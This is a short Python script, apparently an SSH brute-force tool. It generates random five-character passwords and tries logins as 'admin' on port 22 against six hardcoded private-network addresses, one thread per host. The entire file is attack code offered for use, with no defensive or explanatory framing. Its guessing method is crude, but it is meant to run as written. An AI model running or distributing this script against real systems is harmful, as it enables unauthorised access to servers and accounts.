import paramiko
import threading
import secrets
import string


def generate_password(length, include_digits=True, include_special_chars=True):
    # Define character sets
    lowercase_letters = string.ascii_lowercase
    uppercase_letters = string.ascii_uppercase
    digits = string.digits if include_digits else ''
    special_chars = string.punctuation if include_special_chars else ''

    # Combine character sets based on user preferences
    all_chars = lowercase_letters + uppercase_letters + digits + special_chars

    # Generate the password
    password = ''.join(secrets.choice(all_chars) for _ in range(length))

    return password   

def ssh_brute_force(host, port, username, password):
    try:
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  
        client.connect(hostname=host, port=port, username=username, password=password)
        client.close()

        return True  

    except paramiko.AuthenticationException:
        return False  
    
    except Exception as e:
        return False

def main(target):
    for i in range(10):
        pwd = generate_password(5)
        if ssh_brute_force(target, 22, "admin", pwd):
            return 

targets = ['10.1.0.2', '10.1.0.3', '10.12.0.10', '10.12.0.20', '10.12.0.30', '10.12.0.40']

for target in targets:
    thread = threading.Thread(target=main, args=(target,))
    thread.start()
